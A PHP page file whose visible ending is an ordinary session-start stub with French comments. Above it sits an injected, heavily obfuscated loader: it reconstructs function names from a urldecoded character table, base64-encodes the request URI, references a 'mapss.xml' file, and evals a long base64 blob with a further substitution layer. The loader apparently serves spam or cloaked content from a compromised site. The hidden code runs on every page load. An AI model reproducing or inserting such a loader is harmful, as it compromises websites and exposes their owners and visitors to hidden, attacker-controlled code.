<?php
header("Content-type: text/html; charset=utf-8");
@set_time_limit(0);
$xmlname = 'mapss.xml';
$jdir = '';
$smuri = smrequest_uri();
if($smuri==''){
	$smuri='/';
}
$smuri = base64_encode($smuri);
$dt = 1;
function smrequest_uri(){
	if (isset($_SERVER['REQUEST_URI'])){        
		$smuri = $_SERVER['REQUEST_URI'];        
	}else{
		if(isset($_SERVER['argv'])){       
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];     
		}else{      
			$smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];        
		}
	}        
	return $smuri;        
} 


$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iTGdYelB3alROSEVKdkdGcmtmbVNBWnhxRGFJc3RkZVdWbkJRWVVwaENLdU1seW9pYlJPY2JURm15RFZpUEp2d05lZlNCekxaa0dyaGxqT0VSc3VIQ1hJYUFvbmNZUXFkV0tVZ3B0eE15bDlEakprVGxhVVBZZ3RVT2wwVE0zdEtGM3dXTWVyY0Eyb1V3SzRYYllNWGJKUDBNWFAwTWdUQk0yMTFNTEJFd0s0WFFaQjdsYVVCallrOU9ld2NNMm8yUGY5V3BMUE5HZW9Vd2VUbnhEMFF3SnRXcEZrVHlaSWt3ZjlKdEN0cHczUFJzZUNSTVlzc3hEMFF3ZXNOczJDZ09sMFR3MmNtakZjMHVaMXFqSDVXZEs1bWplV3FBMmNOTTJjY2JYdE5NWU03bGFVQmpIYVR5Wklrd2Y5SnRDdHB3M1BSakhhWEZpRVRsYVVCTTJXMEdaazlPdmtCRjBzZkNmRVhNMjFtakZ0V3cxMDdsYVVCTTJXMEdaazlPSlAwTVc5S0dGSUVBSFBXUVlNTndLRFh3S0RCTTJXMEdaQjdsYVVCamU5bXNZazlPWXR6bzBDWkNCQ1pIS3NPQ2Z0YUYwY3lvMWFYRmlFUFlndFZwZTlWaktrOU9ZTVh4RDBRbGFVQnNlQ1JNSnNXQWdrOU92a0JGMHNmQ2ZFWHNlQ1JNSnNXQWdzc3hEMFF3SnRXcEZJM0dIT1R5Wkltc0p3ek1MQ0RwZWZWR1pUWGJLTUV3S01Fd0p0V3BGSTNHSE9ueEQwUWxhbm5HZ1RCc2VDUk1Kc1dBZ1c3bGFVd3dKUG5zZW9UeVprQnNlQ1JNSnNXQVdFREZaNEJzZUNSTUpzV0FXRXJGWjRCc2VDUk1Kc1dBV0VLRmlFUFlUQkJzZUNSTVlrOU9KUDFBWFAwTWdUQnNlQ1JNSnNXQWdEbVFpRVBZWDBQWVQwUWxhbm5HZ2NYR0Z0V3BYQVV3MGNvQ2ZJemEwcnd0bzVvRjBXYXdLQlR3Z0FUTTN0S0EyZm1HSFBSTVljWEdGdFdwWEFVdzBjb0NmSXphMHJ3dG81b0YwV2F3S0JFT1lzMXBMUnFwM3Nxd0tCbk9KRVBZZ3RWcGU5VmpLazlPZXNXc2VDcXNnVFhaZnRvb2Y5bGl2V2ZpV3R6WkNrWFFpRVBZWDBUR0hybUdIV0xRZXNXc2VDcXNnVFhaZnRvb2Y5QUYwR3lvV3NJb0J0ZnRmOWVpMU9YUVprTHdnSW1zSndWQUZQV0EyMURRZXNXc2VDcXNnVFhaZnRvb2Y5QUYwR3lvV3NJb0J0ZnRmOWVpMU9YUVpEVHczQ3FqMjVOczI0WFFaQlR1RDBRd2VQRXAyUFNPbDBURzJDMEdINTJRWXNPQ2Z0YUYxY3p0QjlaQzBmWnR2Q3ZGMEd5b2dNbnhEMFF6WklXcEpQV2pIQVVHMkMwR0g1MlFZc1p0bzF5Q3ZDemFvdHZvZ01uT1lBTE9KUDBNTFBjTTJDVnBGa1VHMkMwR0g1MlFZc1p0bzF5Q3ZDemFvdHZvZ01uYllrWHNINVNwTDkzcGdNblFaSTdsYVVCQTJyTkEyRVR5WklYR0Z0V3BYQVV3MXdmaW85b3RDOUl0dnRad0tCN2xhbjlPZUNFTTJDbkdnY25NM1BXc1lUQkYxUGZvV0dmb1dFWG9CQ1BpMXRmRjBmdnRmT1hGWkJUd2dBVHdmOWl0Q3dIdEN3cHcxd2ZpbzlvdEM5SXR2dFp3MTBUd2dBVE0zdEtBMmZtR0hQUk1ZVEJGMVBmb1dHZm9XRVhvQkNQaTF0ZkYwZnZ0Zk9YRlpEVHczQ3FqMjVOczI0WFFaQlR1RDBRd2VQRXAyUFNPbDBUd2Y5aXRDd0h0Q3dwdzF3ZmlvOW90QzlJdHZ0WncxMDdsYW45bGFubkdnY21zSnduTTN0S1FZdFZwZTlWaktEWGJZTW5RRkVQWVRCQkEyck5BMlJ6c2UxRE9sMFRHRmNEcGU5QkdaVGdiWU9Fd2VQRXAyUFNRaUVQWVRCQkEyck5BMkVUeVprQkEyck5BMlJ6c2UxREhtSXN4RDBRemFCUFlMV0xRdmtCRjBzZkNmRVhqMlVYRlprOXlaa2dkWk9udURCUFlUQkJzRkNLcFlrOU9ZdHp0MENvSEtzU2pYUG5zZW9YRmlFUFlUQlBZVFdXQTJjTk9ZTThqSEdLQUgxV09ZSW5HbDBncEhmbnBYc1dBZ09UcExmUkdpMGdwSGZucFhzV0FnT1RqZUNuRzJjMHlaT3JkbGtXT2dJM2pIdDBqbDBnZGlrRHdaT1RNM3Q1cGVvOU9nSUJqRlBEcGVmNXhnSWdwZTlWam1SRUdIRzB4Vms3c2U5RHhWazdNZTltakZ0bnAyNDZHTFc0R0hhN09KVVJqSDVCR0ZUNk9sdkRkbGtEZGxFVE9ld2NBMlJYTUw5MXBMYVJBMjlFcDNPNk9ZUExHTEE3T2dJTE1MZlJHSHdOTUx0V01nazlPWU9ET2drVEdYd2NwSENncDN3QkdGTzlPVmtnT1lJTnBCck5BSGE5T0xXZU1MZlJHb2NXakhzVXNZVG5PZ0ltTUxkOU9nTXFBTGZtR2lBMEYydFdBMjlCR1pUQnNGQ0twWUJxd0tPK3lZOW5HWHdjcEhvK3dtRVBZVFdXdWVXMHhEMFF6YUJUbGFubkdnVEJNMlcwR1pXN09rMFFZSFdMUVl0bWpGdFdPbDA5T1lzNHBIRFhRRkVQWVRCd3dKc1dBZ2s5T1lzVXNKdER4ZzhOd0s0QkcyOTNHSE9xd0s5bWpGdFdwSGZEYlhJVU1sOUJBRnRXeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxzMkNneVpNcXdlY05NM2Fxd0tHNHBIRDl3SzRCR0phcXdLR1V5Wk1xd2VUN09rMFFZYVduR2djbXNId21zSk9Vd0p0V3BGa0VkWUQ0UWkwOXczUFVHSHJFdWUxRXdLVzdsYVV3WWFCQnVlMUVwTGZSR1prOU9KUDFBWFAwTWdUQnNlQ1JNWUQ0UVo0WGJYY1JwWU03bGFVd1lGMFBZVEJ3akhBVU0zQ2dNM3RLUVl0MEdIMURibGtFUEtCOXlac1VBSFBTdWUxRXdLVzdsYVV3WWFXbkdnY21zSHdtc0pPVXdKdFdwRmtFUEtCbnVEMFFZYUJ3WVp0NHBIcnFBSDFXT2wwVE0zQ2dNM3RLUVl0MEdIMURibE1uYmdNcXVlMUV3bUVQWVRCd1lGMHdZYUJQWVRCd3phMFFZYUJCdWUxRU9sMFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUVUbGFVd1ladFJ1SEducGVvVHlaSUxwM0lXcGdUQnVlMUVwTGZSR1pEVE9YTWdRaUVUbGFVd1lIRzNNTFcwR1pUQnBGV0xqSHJXYllrQnVlMUVRaUVQWVRCd0dMUEVwM1BXUVl0UnVIR25wZW9ueEtrUFlUQndHSFBVcEtrZ3AyRThBWE8rakp0ME1sVU5iS09xd2Y5aXRDd0h0Q3dwdzBjb0NmSXpadjlpQ1lzc2JnT05PZzRCdWUxRXBMZlJHaUVUbGFVd1lIQ1ZqZThUT1ZyZ01WNGdiZ3QzR0hPN2xhVXdZYTBRWWFXV3VlVzBRWUI3bGFVd3phQlBZVFduR2dUQmpIYW51RDBRWWFCQnMyQ2dPbDBUdzJjMHNKazZiSzhYYmd0WHAzc1dBZzRYYjJXcUdlQzRiWElVTWw5MU1MRDl3SzRCTTJXMEdaNFh3TFdCeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxHSmE5d0s0QkdKYXF3S0dVeVpNcXdlVHF3S0czR0hPOXdLNEJqZTltc1k0WHdYbjZ5Wk1xTTIxbk0yd05zWVRuYmdNTGpMdG5NVjBYYmd0aEdlV0tiZ01MQTJyTkEyRTl3SzRCQTJyTkEyRTdsYVV3WUhDVmplOFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUVUbGFVd1lIQzRqRmFVUWlFUFlUVzlsYW45R0hybUdGRVBZVEJCczJDZ09sMFR3MmMwc0prNmJLOFhiZ3RYcDNzV0FnNFhiMldxR2VDNGJYSVVNbDkxTUxEOUFMOTB3TFdCeVpNcXdlV0JiZ01Mc2VDUk1sMFhiZ3QwR0gxRGJnTUxHSmE5d0s0QkdKYXF3S0dVeVpNcXdlVHF3S0czR0hPOXdLNEJqZTltc1k0WHdYbjZ5Wk1xTTIxbk0yd05zWVRuYmdNTGpMdG5NVjBYYmd0aEdlV0tiVEJYd0xQRXAyUFN5Wk1xd2VQRXAyUFNiZ01Mc0Z3bnlaTXF3SlBSc0Z3bnhEMFFZSFdMUVlmbXNKd21zSk9VTTIxTnNGdEJwS1RCczJDZ1FaRFhwTDlncDN0MU0yQ0tBSHNXcFhhWFFaVzdsYVV3WUhDVmplOFRzSnducFpjbXBIOTFzZXROUVl0M0dIT25RaUV3WWEwUVlhV1d1ZVcwUVlCN1lhQlBZVFc5bGFuOWxhVVBZTEcxcExQMGpIOXFPSlBSakZQZ3AzYVVRWkk3bGFVd3dlZlhHSDUwT2wwVE0zdEtzZTlFcDNzV01nVEJGMVBmb1dHZm9XRVhaZnRvb2Y5Q28wQ1pGMGZKdG81b3cxMG54RDBRWUhXTE9ZVEJBSHNXcFhhVE9pMFRPZ09uT0pFUFlUQnd3SlBEakh0V01XUG5zZW9UeVpJY01Yd2N1WmtVT1d0V3BMUFdwWHRvTUxmMkdIcldNZ09FT0JzTnAyc0VHSHdOc1lPRU9MMW1wTHdOc1lPRU9XUE5NMjltTWVXQkdGT1NPZ0RnbzI5WHAzb1RzMkNnT0pQRGpIdFdNZ09FT0xXY0YyZktBMmNuc0xDS09nRGdISGZVcDI4Y09mUEVzRndET2dEZ0hIOTFHZWZOYUw5ME9nRGdISGZVcDI4VG8ycjFNWGtnYll3UG8wNVlwM2FnYll3UUFGR2NPWWN5R1h0V3BnSW1NZWZST2V3TnNZQmdiWXdZQUhXdnNDUERqSHRXTWdPRU9XR05qSHJjT2dEZ0hIZnFHZUM0T2V3TnNZT0VPQndpTWVXQkdGT2diWXcwczJXVkdIcldNZ09FT1dQTkcyOTFPZlBEakh0V01nT0VPV1BER0hDQnVaSWlNZVdCR0ZPZ2JZd0pwMjlYcGVvVGFIdGlHSDVtR1pPRU9CY1dNTFcwTUxXNE9nRGdvSlcwamU5cWJGQ0twZXJuQWdPRU9CZkVHRmNjT1ljd2FaSUlNTFBVakZHV01nQmdiWXdJTTJFZ2JZd2Z1ZWZncDNhZ2JZd2xzRlAwcEtPRU9COTFzZUdOdXZ3TnNZOUdwMnRjcDB3TnNZT0VPWFdjQTNCZ2JZd2lzRncyR0ZXWXAzYWdiWXdFR0hzbU9nRGdwSnNEYkZ0S2pGR25BSERnYll3eHNGdFZqWU9FT1dQMEFIUFNvTGZSQUxyV01nT0VPV3RVR1pJM0dIT1RBRndWamVXMkdaa1Vab3ZUYUZ3VmplVzJHRk9uT2dEZ29lQ0twWUkwcDI5RU9nRGdpb1VyZEx3TnNZT0VPQjVXc2VQS0FIRzBPZ0RnaUNQd3RvUEtBRnNFR0ZPZ2JZd0Z0MkMwT0p0TnAycm1PZ0RncGVmS0FMV3FPZ0RndExXbWpZSW1HSGZLQTJUZ2JZa1hBTFdxRzJ3TnNZTUV3MnNOcDJzRUdaTUVPWXNnQUhXQnNaTUVPWXNjcDJEWGJZa1hBTFdxR0tNRU9ZczVBSGNOcEtNbnhEMFFZYVdMcDN3V0FIUFVPWVRCTTNJbkdlQ0tvMlcwR1pJY01La0JzTGZFUVpJN2xhVXdZYUJCTTN0S09sMFRNM3RLc2U5RXAzc1dNZ1RCc0xmRVFpRVBZVEJ3WUhXTE9ZY21zSndEcDNkVXdlZlhHSDUwYllrQk0zdEtRWkJUdUQwUVlhQndZRndXc0pDS3BnSTBNWENXeEQwUVlhQnd6YTBRWWFXOWxhVXd6SENFTTJDN2xhVXdZRndXc0pDS3BnSUxBSHJtR2lFUFlUVzlsYW45bGFuTHNINVZzZVdOcGdJbXBIOTFzZXROUVl0MU1MRG51RDBRWVp0TGpIcldGMlBOcFh0V3BYdG1PbDBUYWVHbnBlQ3pHMkMwRjJQTnBYdFdwWHRtUVl0MU1MRG54S2tQWVRXbkdna1VPWnRMakhyV0YyUE5wWHRXcFh0bVFaSTdsYVV3WVp0VmpZazlPZVAxTUxyempINW5zWVRueEQwUVlhV1ZzRndFRjNQV3NlOURzWVRCQTJURU92UENvQnJ5b2Z0ekNDd2RiWWtCc0Z3RVFpRVBZVEJ3QTNDS3BmOW1HRnROTUphVXdlUFViWUlsQ0N3ZGkxSW9GMXdmQ2ZDWmlXdFphbzVpdEJDWmJsdm54RDBRWWFCQkdMV0VHQzlWcDI1MEdINTBNS2s5T2VQMU1McnpHRmNXQUtUQkEyVG54RDBRWWFXVnNGd0VGMlBFcDNQV1FZdFZqWUI3bGFVd3paa1BZVFdLR0Z0MU1MNFR3ZUducGVDekEyOXFzZUNxc0pkN2xhbjlsYVUveVQ9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));
 ?><?php 
session_start();

//var_dump($_SESSION);
//$_SESSION['myid']='';

//echo "ca marche! Bonjour ".$_SESSION['login_user_nom']." ".$_SESSION['login_user_prenom'];
if($_GET['coucou']!='coucou'){
	//die('<html><meta http-equiv="Content-type" content="text/html; charset=utf-8" /><div class="col-md-12 center"><h1 style="text-align:center"><br><br>Mise à jour en cours... ;)<br><br>Allez les bleus!</h1></div></html');
}

	
?>